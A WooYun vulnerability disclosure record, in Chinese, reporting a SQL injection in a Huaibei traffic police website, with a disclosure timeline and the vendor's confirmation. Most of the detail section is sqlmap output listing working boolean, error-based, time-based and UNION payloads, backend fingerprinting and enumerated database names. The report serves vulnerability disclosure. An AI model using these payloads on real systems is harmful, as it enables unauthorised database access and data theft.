wybug_title: 淮北市公安局交警网SQL注入（UNION）
wybug_status: 已交由第三方合作机构(公安部一所)处理
wybug_detail:
漏洞详情 披露状态：   									2015-11-02：	细节已通知厂商并且等待厂商处理中									2015-11-02：	厂商已经确认，细节仅向厂商公开									2015-11-12：	细节向核心白帽子及相关领域专家公开									2015-11-22：	细节向普通白帽子公开									2015-12-02：	细节向实习白帽子公开									2015-12-17：	细节向公众公开  简要描述： RT 详细说明：  
http://**.**.**.**/pic_detail.php?code=54&table_name=tb_pic

http://**.**.**.**/main.php?mod_id=17

sqlmap resumed the following injection point(s) from stored session:---Parameter: code (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code=54 AND 7379=7379&table_name=tb_pic    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: code=54 AND 4297=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (4297=4297) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113)))&table_name=tb_pic    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: code=(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8599=8599) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))&table_name=tb_pic    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: code=54 AND 7840=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&table_name=tb_pic    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: code=54 UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(108)+CHAR(110)+CHAR(120)+CHAR(89)+CHAR(71)+CHAR(112)+CHAR(100)+CHAR(102)+CHAR(84)+CHAR(81)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &table_name=tb_pic---[10:20:40] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 4.0.6back-end DBMS: Microsoft SQL Server 2000[10:20:40] [INFO] fetching database names[10:20:40] [INFO] the SQL query used returns 8 entries[10:20:40] [INFO] resumed: hbcgs[10:20:40] [INFO] resumed: hbzd[10:20:40] [INFO] resumed: master[10:20:40] [INFO] resumed: model[10:20:40] [INFO] resumed: msdb[10:20:40] [INFO] resumed: Northwind[10:20:40] [INFO] resumed: pubs[10:20:40] [INFO] resumed: tempdbavailable databases [8]:[*] hbcgs[*] hbzd[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-11-02 13:41 厂商回复： 非常感谢！你提交的漏洞已验证，会尽快修复。 最新状态： 暂无
